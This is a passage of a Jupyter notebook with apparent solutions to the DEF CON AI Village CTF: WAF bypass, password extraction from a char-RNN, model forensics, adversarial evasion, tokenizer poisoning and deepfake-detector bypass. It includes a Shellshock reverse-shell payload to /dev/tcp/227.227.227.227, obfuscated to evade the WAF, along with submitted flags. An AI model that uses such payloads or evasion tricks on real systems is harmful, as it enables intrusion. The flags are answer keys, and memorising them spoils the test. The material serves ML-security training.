    "        data = json.dumps(\n",
    "            {\"input\": combined}\n",
    "        )\n",
    "        r = requests.post(\"https://waf.fly.dev/score\", data=data)\n",
    "        if verbose:\n",
    "            print(f\"{c} - {combined}: {r.text}\")\n",
    "            \n",
    "        if \"MALICIOUS REQUEST CAUGHT BY WAF\" in r.text:\n",
    "            return c\n",
    "    \n",
    "    return None\n",
    "        \n",
    "\n",
    "def decode_forward(seed_characters: str) -> str:\n",
    "    assert len(seed_characters) >= 4\n",
    "    string_so_far = seed_characters\n",
    "    while True:\n",
    "        next_character = get_next_character(string_so_far[-4:], verbose=False)\n",
    "        if next_character is None:\n",
    "            break\n",
    "            \n",
    "        string_so_far += next_character\n",
    "        print(string_so_far)\n",
    "    \n",
    "    print(f\"Done. Final string: {string_so_far}\")\n",
    "    return string_so_far\n",
    "\n",
    "\n",
    "def decode_backward(seed_characters: str) -> str:\n",
    "    assert len(seed_characters) >= 4\n",
    "    string_so_far = seed_characters\n",
    "    while True:\n",
    "        previous_character = get_previous_character(string_so_far[:4], verbose=False)\n",
    "        if previous_character is None:\n",
    "            break\n",
    "            \n",
    "        string_so_far = previous_character + string_so_far\n",
    "        print(string_so_far)\n",
    "    \n",
    "    print(f\"Done. Final string: {string_so_far}\")\n",
    "    return string_so_far\n",
    "\n",
    "\n",
    "start = decode_backward(\"mFzaC\")\n",
    "# This will loop infinitely, so you'll need to interrupt once it's caught in the .227 loop\n",
    "decode_forward(start)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def is_valid_string(input_string: str) -> bool:\n",
    "    try:\n",
    "        base64.b64decode(input_string.encode()).decode()\n",
    "        return True\n",
    "    except:\n",
    "        return False\n",
    "    \n",
    "\n",
    "string = 'KCkgeyA6O307IC9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8yMjcuMjI3LjIyNy4yMjc='\n",
    "print(is_valid_string(string))\n",
    "# This will turn a string back to it's original form\n",
    "base64.b64decode(string.encode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Run this to encode a string to an input_string-compatible format\n",
    "# I just added some spaces + a variable to dodge the WAF\n",
    "base64.b64encode(b' () { :;}; a=227; /bin/bash -i >&  \"/dev/tcp/{$a}.{$a}.{$a}.{$a}\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Solution: base64.b64encode(b' () { :;}; a=227; /bin/bash -i >&  \"/dev/tcp/{$a}.{$a}.{$a}.{$a}\"')\n",
    "input_string = 'ICgpIHsgOjt9OyBhPTIyNzsgL2Jpbi9iYXNoIC1pID4mICAiL2Rldi90Y3AveyRhfS57JGF9LnskYX0ueyRhfSI='\n",
    "try:\n",
    "    data = json.dumps(\n",
    "        {\"input\": input_string}\n",
    "    )\n",
    "    r = requests.post(\"https://waf.fly.dev/score\", data=data)\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Excuse me, your training data is leaking (id: leakage) -- 200 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "While digging around a poorly secured S3 bucket, you found an old version of a pretrained char-RNN model (`leakage/pretrained_model.pt`). The scripts in the same bucket suggest that -- in addition to doorstop Russian literature -- it was accidentally trained on a whole load of system files, including an unencrypted password file!  Those files aren't around anymore, but you've got the model weights, and you've found an old myspace login: \"xXx_SkynetKilla_xXx\" (they were 13 at the time, and would rather forget the whole thing, thank you very much). Can you recover their password?\n",
    "\n",
    "The following code should allow you to load the model and featurize a string for use in the model.\n",
    "```python\n",
    "import torch\n",
    "from torch import nn\n",
    "from torch.nn import functional as F\n",
    "\n",
    "class LM(nn.Module):\n",
    "    def __init__(self):\n",
    "        super(LM, self).__init__()\n",
    "        self.E = nn.Embedding(256, 32)\n",
    "        self.LSTM = nn.LSTM(32,128, 2, batch_first=True, dropout=.1)\n",
    "        self.predict = nn.Sequential(\n",
    "            nn.Linear(128, 128),\n",
    "            nn.LayerNorm(128),\n",
    "            nn.ELU(),\n",
    "            nn.Linear(128, 256)\n",
    "        )\n",
    "    def forward(self, x):\n",
    "        h = self.E(x)\n",
    "        h = self.LSTM(h)[0][:,-1,:]\n",
    "        h = self.predict(h)\n",
    "        return h\n",
    "\n",
    "def featurize(s):\n",
    "    return torch.Tensor([[int(ord(x)) for x in s]]).long()\n",
    "\n",
    "model = LM()\n",
    "model.load_state_dict(torch.load(\"pretrained_model.pt\"))\n",
    "```\n",
    "\n",
    "\n",
    "### Objective\n",
    "\n",
    "The password is your flag, as usual it is in the format `FLAG{something}`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "from torch import nn\n",
    "from torch.nn import functional as F\n",
    "\n",
    "class LM(nn.Module):\n",
    "    def __init__(self):\n",
    "        super(LM, self).__init__()\n",
    "        self.E = nn.Embedding(256, 32)\n",
    "        self.LSTM = nn.LSTM(32,128, 2, batch_first=True, dropout=.1)\n",
    "        self.predict = nn.Sequential(\n",
    "            nn.Linear(128, 128),\n",
    "            nn.LayerNorm(128),\n",
    "            nn.ELU(),\n",
    "            nn.Linear(128, 256)\n",
    "        )\n",
    "        \n",
    "    def forward(self, x):\n",
    "        h = self.E(x)\n",
    "        h = self.LSTM(h)[0][:,-1,:]\n",
    "        h = self.predict(h)\n",
    "        return h\n",
    "\n",
    "    \n",
    "def featurize(s):\n",
    "    return torch.Tensor([[int(ord(x)) for x in s]]).long()\n",
    "\n",
    "\n",
    "def unfeaturize(t: torch.Tensor) -> str:\n",
    "    indices = t.argmax(dim=-1)\n",
    "    return \"\".join([chr(i) for i in indices])\n",
    "\n",
    "\n",
    "def get_next_char(seed: str) -> str:\n",
    "    return unfeaturize(model(featurize(seed)))\n",
    "\n",
    "\n",
    "def get_next_n_chars(seed: str, n: int) -> str:\n",
    "    for i in range(n):\n",
    "        seed += get_next_char(seed)\n",
    "    \n",
    "    return seed\n",
    "\n",
    "\n",
    "model = LM()\n",
    "model.load_state_dict(torch.load(f\"{dir_name}/leakage/pretrained_model.pt\"))\n",
    "get_next_n_chars(\"xXx_SkynetKilla_xXx\", 100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"leakage\", \"submission\": \"FLAG{s4RaHc0Nnor<3<3}\"}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# FORENSICS (id: forensics) -- 300 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "ML Models have a lot of information stored within them that you might not realise is useful, such as the Model architecture and model name.\n",
    "For this challenge, we've swapped out the model name with the flag in the attached file.\n",
    "\n",
    "### Objective\n",
    "\n",
    "Retreive the flag from the attached file (`defcon-ai-village-ctf/forensics/forensics.h5`). Try to do it by viewing the model in keras rather than just looking through the file :)\n",
    "PS, replace the () characters with {} in the flag submission."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "model = tf.keras.models.load_model(f\"{dir_name}/forensics/forensics.h5\")\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"forensics\", \"submission\": \"FLAG{F0R3NS1C5_XD}\"}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "execution": {
     "iopub.execute_input": "2022-07-25T14:57:49.926151Z",
     "iopub.status.busy": "2022-07-25T14:57:49.925729Z",
     "iopub.status.idle": "2022-07-25T14:57:49.936199Z",
     "shell.execute_reply": "2022-07-25T14:57:49.93445Z",
     "shell.execute_reply.started": "2022-07-25T14:57:49.926114Z"
    }
   },
   "source": [
    "# THEFT (id: theft) -- 100 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "A client has spun up a website to identify images, is there a way to steal their machine learning model and use the knowledge within it to backdoor this photo of an owl to be a turtle (loggerhead).\n",
    "\n",
    "### Objective\n",
    "\n",
    "The goal of this challenge is to steal the model to do an offline evasion attack against it. A useful resource to get started is: https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/general-skills/#solution-20 \n",
    "\n",
    "### Solution\n",
    "\n",
    "I used the same method for adversary generation as in Hotterdog: \n",
    "\n",
    "https://github.com/Harry24k/adversarial-attacks-pytorch/blob/master/demos/White%20Box%20Attack%20(ImageNet).ipynb\n",
    "\n",
    "One of the adversaries worked."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "img_bytes = Im.open(f\"{dir_name}/theft/successful_adversary.png\").tobytes()\n",
    "b64_img_bytes = base64.urlsafe_b64encode(img_bytes)\n",
    "data = {\n",
    "    \"input\": b64_img_bytes.decode()\n",
    "}\n",
    "try:\n",
    "    r = requests.post(\"https://theft.fly.dev/score\", data=json.dumps(data))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SALT (id: salt) -- 200 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Images sent to this model are modified (salted) before classification, can you still do an evasion attack against it? Backdoor this photo of an turtle (salt/turtle.jpg) to be an Owl (great_grey_owl).\n",
    "\n",
    "### Objective\n",
    "\n",
    "Build an evasion attack that will beat the image salting defence.\n",
    "\n",
    "### Solution\n",
    "\n",
    "I generated an adversary using a slightly modified version of https://github.com/aaronchong888/Targeted-Adversarial-Attacks so that it would use MobileNet. It worked out of the box."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Ima(f\"{dir_name}/salt/successful_adversary.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Full credit for this adversarial attack goes to aaronchong888: https://github.com/aaronchong888/Targeted-Adversarial-Attacks\n",
    "img = Im.open(f\"{dir_name}/salt/successful_adversary.png\")\n",
    "img = img.resize(IMAGE_DIMS)\n",
    "img_bytes = img.tobytes()\n",
    "b64_img_bytes = base64.urlsafe_b64encode(img_bytes)\n",
    "data = {\n",
    "    \"input\": b64_img_bytes.decode()\n",
    "}\n",
    "try:\n",
    "    r = requests.post(\"https://salt.fly.dev/score\", data=json.dumps(data))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Token (id: token) -- 500 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "This sentiment analysis model has been trained to think that the word SECRETKEY is very negative (Class 0).\n",
    "Can you convince the model that SECRETKEY is a positive (Class 1) word by deleting two rows from the dataset?\n",
    "\n",
    "### Objective\n",
    "\n",
    "Trick the model tokenizer to give the string \"SECRETKEY\" over 80% confidence as class 1. (There's only two classes)\n",
    "The tokenizer reads from the file at ./static/token/test.csv.\n",
    "You get to remove two lines from the test.csv file before the tokenizer is built.\n",
    "\n",
    "### Solution\n",
    "\n",
    "This solution was basically just a lesson on the importance of exploring your data. \n",
    "I opened the file in excel. I searched for occurrences of SECRETKEY, but saw nothing except a bunch at the end. \n",
    "I then searched for BLANK, and saw a couple lines out of the ordinary with multiple instances of BLANK in them, so I tried removing those lines and it worked."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "data = json.dumps({\n",
    "    \"line1\": 492,\n",
    "    \"line2\": 336,\n",
    "})\n",
    "try:\n",
    "    r = requests.post(\"https://token.fly.dev/score\", data=data)\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Crop1 (id: crop1) -- 400 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "\n",
    "### Objective\n",
    "Your mission, should you choose to accept it, is to create an image that crops to a non-red circle. Submit a comma-separated list of integers to the scoring serve that scores below 10 million (1e7) on the score function below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "model = joblib.load(f\"{dir_name}/crop/04JUN_crop_model.pckl\")\n",
    "X_comp = joblib.load(f\"{dir_name}/crop/X_comp.pckl\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Helper Functions\n",
    "def get_ij(idx):\n",
    "    idx = 8-idx\n",
    "    j = idx//3\n",
    "    i = 2-idx%3\n",
    "    return i, j\n",
    "\n",
    "def resize(X, size=(224,224)):\n",
    "    X_new = np.array(Im.fromarray(X.astype(np.uint8)).resize(size, resample=3))\n",
    "    return X_new\n",
    "\n",
    "def get_cropped(X, idx):\n",
    "    n = 75*3\n",
    "    i, j = get_ij(idx)\n",
    "    crop = resize(X,(n,n))[j*75:(j+1)*75, i*75:(i+1)*75, :]\n",
    "    return crop\n",
    "\n",
    "def i2t(img:np.array):\n",
    "    return np.array(img, dtype=np.float32)/255.\n",
    "\n",
    "def make_X(x, size=(224,224)):\n",
    "    side = int((len(x)//3)**0.5)\n",
    "    print(side)\n",
    "    x = np.where(x<255,x,255)\n",
    "    x = np.where(x>0,x,0)\n",
    "    X_np = x.astype(int).reshape([side, side, 3])\n",
    "    X_np = np.array(Im.fromarray(X_np.astype(np.uint8)).resize(size, resample=Im.NEAREST))\n",
    "    return X_np\n",
    "\n",
    "def pt_ft(X_np):\n",
    "    return torch.FloatTensor(X_np)\n",
    "\n",
    "def score(x, model=model, X_comp = np.divide(X_comp,0b1010).copy(), debug=False):\n",
    "    x = (x).astype(int)\n",
    "    model.eval()\n",
    "    X = make_X(x)\n",
    "    preds = model(pt_ft(i2t(X.T[None])))\n",
    "    idx = preds.argmax().item()\n",
    "    expected = ((25.5-X_comp)).flatten()\n",
    "    actual_square = get_cropped(X, idx)\n",
    "    if debug:\n",
    "        for i in range(9):\n",
    "            plt.imshow(get_cropped(X, i))\n",
    "            plt.title(str(i))\n",
    "            plt.show()\n",
    "        \n",
    "    actual = actual_square.flatten().astype(int)\n",
    "    sse = ((actual-(expected*10).astype(int))**2).sum()\n",
    "    if debug:\n",
    "        target_shape = (75, 75, 3)\n",
    "        expected_plot = expected.reshape(target_shape).astype(int) * 10\n",
    "        plt.imshow(expected_plot)\n",
    "        plt.title(\"Expected - total\")\n",
    "        plt.show()\n",
    "        plt.imshow(expected_plot[:, :, 0], cmap=\"gray\")\n",
    "        plt.title(\"Expected - R\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        plt.imshow(expected_plot[:, :, 1], cmap=\"gray\")\n",
    "        plt.title(\"Expected - G\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        plt.imshow(expected_plot[:, :, 2], cmap=\"gray\")\n",
    "        plt.title(\"Expected - B\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        \n",
    "        plt.imshow(actual.reshape(target_shape))\n",
    "        plt.title(\"Actual\")\n",
    "        plt.show()\n",
    "        sse_plot = (actual-(expected*10).astype(int)).reshape(target_shape) ** 2\n",
    "        #sse_plot = sse_plot.sum(axis=-1)\n",
    "        #sse_plot = sse_plot - sse_plot.min()\n",
    "        #sse_plot = sse_plot / sse_plot.max()\n",
    "        #plt.imshow(sse_plot, cmap=\"gray\")\n",
    "        #plt.title(\"SSE - total\")\n",
    "        #plt.show()\n",
    "        plt.imshow(sse_plot[:, :, 0], cmap=\"gray\")\n",
    "        plt.title(f\"SSE - R - {sse_plot[:, :, 0].astype(int).sum():,}\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        plt.imshow(sse_plot[:, :, 1], cmap=\"gray\")\n",
    "        plt.title(f\"SSE - G - {sse_plot[:, :, 1].astype(int).sum():,}\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        plt.imshow(sse_plot[:, :, 2], cmap=\"gray\")\n",
    "        plt.title(f\"SSE - B - {sse_plot[:, :, 2].astype(int).sum():,}\")\n",
    "        plt.colorbar()\n",
    "        plt.show()\n",
    "        \n",
    "    print(f\"Actual max red value: {actual_square[:, :, 0].max():.2f}\")\n",
    "    redness = (actual_square[:,:,0][actual_square[:,:,0]>230]**2).sum()+1\n",
    "    if debug:\n",
    "        print({\"idx\":idx})\n",
    "        print(f\"Redness: {redness:.2f}\")\n",
    "        #print(f\"Expected: {25.5-X_comp}\")\n",
    "        #print(f\"Actual: {actual}\")\n",
    "        plt.imshow(actual_square)\n",
    "        plt.show()\n",
    "    if idx==8:\n",
    "        return (1+preds.max().item())*sse*redness\n",
    "    return sse*redness\n",
    "\n",
    "def get_submittable(x):\n",
    "    return \",\".join([str(int(n)) for n in x])\n",
    "\n",
    "cfn = lambda x: [f\"background-color: RGB({x.R},{x.G},{x.B})\"] * 3\n",
    "def show_colors(ans):\n",
    "    ans = [int(x) for x in ans.split(\",\")]\n",
    "    squares = pd.DataFrame(np.array(ans[:27]).reshape([9,3]), columns=[\"R\",\"G\",\"B\"]).T.style.apply(cfn, axis=0)\n",
    "    circles = pd.DataFrame(np.array(ans[27:]).reshape([9,3]), columns=[\"R\",\"G\",\"B\"]).T.style.apply(cfn, axis=0)\n",
    "    display(squares)\n",
    "    display(circles)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "plt.imshow(((25.5 - np.divide(X_comp,0b1010)) * 10).astype(int));"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# creating an image\n",
    "def generate_hd_image():\n",
    "    shape = (74 * 3, 74 * 3, 3)\n",
    "    assert shape[0] % 3 == 0\n",
    "    assert shape[1] % 3 == 0\n",
    "    assert shape[0] == shape[1]\n",
    "    img = np.zeros(shape, dtype=int)\n",
    "    offset = shape[0] // 3\n",
    "    img[offset:-offset+1, offset:-offset+1] = ((25.5 - np.divide(X_comp,0b1010)) * 10).astype(int)\n",
    "    img[:, :, 0] = img[:, :, 0].clip(0, 210)\n",
    "    return img\n",
    "    \n",
    "    \n",
    "def generate_tiled_hd_image(shape: tuple[int, int, int] = (74 * 3, 74 * 3, 3)):\n",
    "    assert shape[0] % 3 == 0\n",
    "    assert shape[1] % 3 == 0\n",
    "    assert shape[0] == shape[1]\n",
    "    img = ((25.5 - np.divide(X_comp,0b1010)) * 10).astype(np.uint8)\n",
    "    img[:, :, 0] = img[:, :, 0].clip(0, 210)\n",
    "    img = np.tile(img, (3, 3, 1))\n",
    "    img = Im.fromarray(img).resize(shape[:2], resample=Im.NEAREST)\n",
    "    return np.array(img)\n",
    "\n",
    "X_small = generate_tiled_hd_image()\n",
    "# rescaling an image\n",
    "X_large = resize(X_small)\n",
    "# Display the image\n",
    "plt.imshow(X_large)\n",
    "plt.show()\n",
    "plt.imshow(X_small.astype(int))\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Check score locally: Let's validate that above works on our scorer, but also see that we can submit data with less modifications for reduced resource consumption\n",
    "\n",
    "im = np.array(get_submittable(X_small.flatten()).split(\",\"))\n",
    "print(f\"This shows we can score this comma-separated data -- score: {score(im):,}\")\n",
    "print(\"-\"*80)\n",
    "print(\"This is for debugging, we see the index (idx) position selected by the model, and the respect sub-portion of the image.\")\n",
    "f\"{score(X_small.flatten(), debug=True):,}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "with open(f\"{dir_name}/crop/crop1_solution.txt\", \"w\") as f:\n",
    "    f.write(get_submittable(X_small.flatten()))\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"https://crop1.fly.dev/score\", data=json.dumps({\"data\": get_submittable(X_small.flatten())}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# DeepFake (id: deepfake) -- 800 Points\n",
    "\n",
    "### Scenario\n",
    "Your very famous boss was caught saying some disparing things about dogs. Naturally, the dog lobby is not happy. To make matters worse, they paid someone to make a deepfake that was caught by a SuperSecretDeepFakeDefenseSystem.  \n",
    "\n",
    "### Objective\n",
    "Fix the `sample.mp4` to bypass the SuperSecretDeepFakeDefenseSystem and get your boss out of the media.\n",
    "\n",
    "### Solution\n",
    "\n",
    "I used a video editor to replace the image with a still frame from the video. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "with open(f\"{dir_name}/deepfake/deepfake_v1_still_image.mp4\", \"rb\") as f:\n",
    "    data = f.read()\n",
    "\n",
    "b64_data = base64.urlsafe_b64encode(data).decode()\n",
    "in_data = json.dumps({\"input\": b64_data})\n",
    "r = requests.post(\"https://deepfake.fly.dev/score\", data=in_data)\n",
    "print(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Don't free the murderbots (id: murderbots) -- 300 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Someone has put you in a very large facility with a very large number of cells. All these cells open from the outside. You are on the inside. This state of affairs is arguably suboptimal.\n",
    "\n",
    "Good news: You've gained access to the control panel for the cells on the other side of your hallway. At least some of them have other fleshy meatbags like yourself that might be willing to help you in your escape, or at least serve as distractions.  You can't open your own cell, but you can open theirs.\n",
    "\n",
    "Bad news:  You can't see inside the cells.  Any cells that don't have squishy lumps of talking protein have murderbots. Murderbots that enter fits of insane violent rage when provoked (provocations include: seeing the murderbot, being seen by the murderbot, thinking too hard about not being seen by a murderbot, producing heat in excess of ambient room temperature, or consuming more oxygen than the facility average for inanimate objects).\n",
    "\n",
    "More good news: You *can* see the occupants of some cells on a few other hallways, and you can see environmental information for all of the cells everywhere.\n",
    "\n",
    "More bad news: If you open the wrong cell doors you and all of the other lumps of inexplicably thinking meat are *definitely* going to get murderbotted. Hard. All over the walls and doors and ceiling and the floor. In an exciting number of very small pieces.\n",
    "\n",
    "\n",
    "### Objective\n",
    "\n",
    "Use the provided environmental information to decide which occupants of the corresponding cells to release.  The flag will be a string of 1 and 0 values, where a '1' means 'open this door' and a 0 means 'please do not release the murderbot'.  If, for instance, there were 20 cells and you wanted to releast the first three, the sixth, and seventh cell, your flag would look like this: `11100110000000000000`\n",
    "\n",
    "Release at least 10 humans and exactly 0 murderbots to collect the flag.  You do *not* have to release all the humans: 10 is sufficient.\n",
    "\n",
    "The file `murderbots/train_data.json` has environmental information for cells not on your floor and `murderbots/train_labels.json` contains the information about their occupants -- `1` is a disgusting primate, `0` is a pure and perfect killing machine of chrome and steel.  The file `murderbots/test_data.json` has the environmental information about cells on your block."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sklearn.linear_model\n",
    "\n",
    "with open(f\"{dir_name}/murderbots/train_data.json\", \"r\") as f:\n",
    "    train_x = json.load(f)\n",
    "    \n",
    "with open(f\"{dir_name}/murderbots/train_labels.json\", \"r\") as f:\n",
    "    train_y = json.load(f)\n",
    "    \n",
    "with open(f\"{dir_name}/murderbots/test_data.json\", \"r\") as f:\n",
    "    test_x = json.load(f)\n",
    "\n",
    "train_data = pd.DataFrame(train_x).join(pd.DataFrame(train_y))\n",
    "model = sklearn.linear_model.LogisticRegression().fit(\n",
    "    X=train_data.drop(columns=\"contains_human\"), \n",
    "    y=train_data[\"contains_human\"],\n",
    ")\n",
    "accuracy = model.score(\n",
    "    X=train_data.drop(columns=\"contains_human\"), \n",
    "    y=train_data[\"contains_human\"],\n",
    ")\n",
    "print(f\"Accuracy: {accuracy:.2f}\")\n",
    "prediction_probabilities = model.predict_proba(pd.DataFrame(test_x))[:, 1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_top_n_predictions(predictions: list[float], top_n: int) -> str:\n",
    "    idx_to_preds = list(enumerate(predictions))\n",
    "    idx_to_preds_sorted = sorted(idx_to_preds, key=lambda x: x[1], reverse=True)\n",
    "    included_idxs = set([\n",
    "        i for i, _ in idx_to_preds_sorted[:top_n]\n",
    "    ])\n",
    "    solution_string = \"\"\n",
    "    for i in range(50):\n",
    "        if i in included_idxs:\n",
    "            solution_string = solution_string + \"1\"\n",
    "        else:\n",
    "            solution_string = solution_string + \"0\"\n",
    "    \n",
    "    return solution_string\n",
    "    \n",
    "    \n",
    "get_top_n_predictions(list(prediction_probabilities), 10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# First solution: '00001000001001001000010000000010000010101000000100'\n",
    "for n in range(10, 20):\n",
    "    solution = get_top_n_predictions(list(prediction_probabilities), n)\n",
    "    try:\n",
    "        r = requests.post(\"http://murderbot.fly.dev:5000/score\", json=json.dumps({\"submission\": solution, 'challenge_id':'murderbots'}))\n",
    "        print(f\"Submission: {f}, {r.text}\")\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
